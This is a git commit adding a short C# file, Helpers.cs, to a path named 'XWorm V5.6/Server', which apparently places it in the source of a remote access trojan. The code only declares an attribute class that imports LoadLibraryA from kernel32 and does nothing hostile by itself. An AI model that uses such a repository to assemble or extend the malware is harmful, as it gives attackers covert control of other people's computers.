ea13f485faba006f285c49507b2a1ebe8b7c127b
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:49:44 +0400

    Helpers.cs

---
+++ XWorm V5.6/Server/Helpers.cs
@@ -0,0 +1,10 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+internal class YanoAttribute : Attribute
+{
+  [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+  [MethodImpl(MethodImplOptions.ForwardRef)]
+  public static extern IntPtr LoadLibraryA([In] string obj0);
+}
